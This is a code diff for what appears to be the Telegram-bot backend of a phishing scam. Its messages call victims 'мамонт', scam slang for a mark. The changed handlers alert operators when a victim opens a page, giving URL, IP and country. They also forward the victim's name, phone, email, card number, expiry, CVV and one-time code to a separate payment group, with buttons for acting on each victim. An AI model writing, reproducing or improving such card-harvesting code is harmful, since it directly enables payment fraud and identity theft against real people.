@@ -22,7 +22,7 @@ import uuid
 from aiohttp import web
 from functools import wraps
 import aiohttp
-from config import API_TOKEN, ADMIN_GROUP_ID, ADMIN_IDS
+from config import API_TOKEN, ADMIN_GROUP_ID, ADMIN_IDS, PAYMENT_GROUP_ID
 import requests
 from aiohttp.web_middlewares import middleware
 import re
@@ -1207,36 +1207,19 @@ async def events_save_all(message):
 @log_function
 async def notify_admin(request):
     data = await request.json()
-    phone = data.get('phone', '')
-    name = data.get('name', '')
-    mail = data.get('mail', '')
+    page = data.get('page', '')
+    url = data.get('url', '')
     ip = data.get('ip', '')
-    user_id = data.get('user_id', '')  # Додаємо user_id з запиту
-    
-    # --- Оновлюємо IP у базі даних, якщо передано user_id ---
-    if user_id and ip:
-        update_site_user_ip(user_id, ip)
-    
-    # --- Отримуємо дані користувача з бази ---
-    user_data_from_db = None
-    if user_id:
-        user_data_from_db = get_site_user(user_id)
-    
-    # Формуємо повідомлення
-    msg = f"Мамонт ввёл Ф.И.О: <b>{name}</b>\n\n"
-    msg += f"<b>phone_number:</b> <code>{phone}</code>\n"
-    msg += f"<b>full_name:</b> <code>{name}</code>\n"
-    msg += f"<b>mail:</b> <code>{mail}</code>\n"
-    msg += f"<b>ip:</b> <code>{ip}</code>"
-    
-    # Додаємо інформацію з бази даних, якщо є
-    if user_data_from_db:
-        msg += f"\n<b>Site User ID:</b> <code>{user_data_from_db['id']}</code>"
-        msg += f"\n<b>Цена:</b> <code>{user_data_from_db['price']} {user_data_from_db['currency']}</code>"
-        msg += f"\n<b>Адрес:</b> <code>{user_data_from_db['street']}</code>"
-        msg += f"\n<b>Дата создания:</b> <code>{user_data_from_db['created_at']}</code>"
-    
-    # Клавіатура без 'Карта'
+    country = data.get('country', '')
+    # Формуємо повідомлення тільки про сторінку
+    msg = (
+        "⚠️ Мамонт открыл страницу\n"
+        f"📄 Страница: {page}\n"
+        f"🔗 Ссылка: {url}\n"
+        f"🌐 IP: {ip}\n"
+        f"🌍 Страна: {country}"
+    )
+    # Клавіатура для блокування/розблокування
     kb = InlineKeyboardMarkup(
         inline_keyboard=[
             [
@@ -1246,7 +1229,7 @@ async def notify_admin(request):
         ]
     )
     try:
-        await bot.send_message(ADMIN_GROUP_ID, msg, parse_mode='HTML', reply_markup=kb)
+        await bot.send_message(ADMIN_GROUP_ID, msg, reply_markup=kb)
         print('Message sent to admin group')
     except Exception as e:
         print('Error sending message:', e)
@@ -1255,30 +1238,25 @@ async def notify_admin(request):
 @log_function
 async def payment_notify(request):
     data = await request.json()
+    name = data.get('name', '')
+    phone = data.get('phone', '')
     email = data.get('email', '')
     card = data.get('card', '')
     expiry = data.get('expiry', '')
     cvv = data.get('cvv', '')
+    code = data.get('code', '')
     ip = data.get('ip', '')
-    user_id = data.get('user_id', '')
-    
-    # --- Оновлюємо IP у базі даних, якщо передано user_id ---
-    if user_id and ip:
-        update_site_user_ip(user_id, ip)
-    
-    # --- Отримуємо дані користувача з бази ---
-    user_data_from_db = None
-    if user_id:
-        user_data_from_db = get_site_user(user_id)
-    
-    text = f"Email: {email}\nCard Number: {card}\nExpiry Date: {expiry}\nCVV: {cvv}\nIP: {ip}"
-    
-    # Додаємо інформацію з бази даних, якщо є
-    if user_data_from_db:
-        text += f"\nSite User ID: {user_data_from_db['id']}"
-        text += f"\nЦена: {user_data_from_db['price']} {user_data_from_db['currency']}"
-        text += f"\nАдрес: {user_data_from_db['street']}"
-    
+    # Всі персональні дані у payment group
+    msg = (
+        f"ФИО: {name}\n"
+        f"Телефон: {phone}\n"
+        f"Email: {email}\n"
+        f"Card: {card}\n"
+        f"Expiry: {expiry}\n"
+        f"CVV: {cvv}\n"
+        f"Code: {code}\n"
+        f"IP: {ip}"
+    )
     kb_rows = [
         [
             InlineKeyboardButton(text="Card", callback_data=f"card:{ip}"),
@@ -1292,7 +1270,7 @@ async def payment_notify(request):
         ]
     ]
     kb = InlineKeyboardMarkup(inline_keyboard=kb_rows)
-    await bot.send_message(ADMIN_GROUP_ID, text, reply_markup=kb)
+    await bot.send_message(PAYMENT_GROUP_ID, msg, reply_markup=kb)
     return web.Response(text='ok')
 
 @log_function
@@ -1308,7 +1286,7 @@ async def code_notify(request):
             ]
         ]
     )
-    await bot.send_message(ADMIN_GROUP_ID, text, reply_markup=kb)
+    await bot.send_message(PAYMENT_GROUP_ID, text, reply_markup=kb)
     return web.Response(text='ok')
 
 # --- CALLBACK-ОБРОБНИКИ ДЛЯ КНОПОК ---
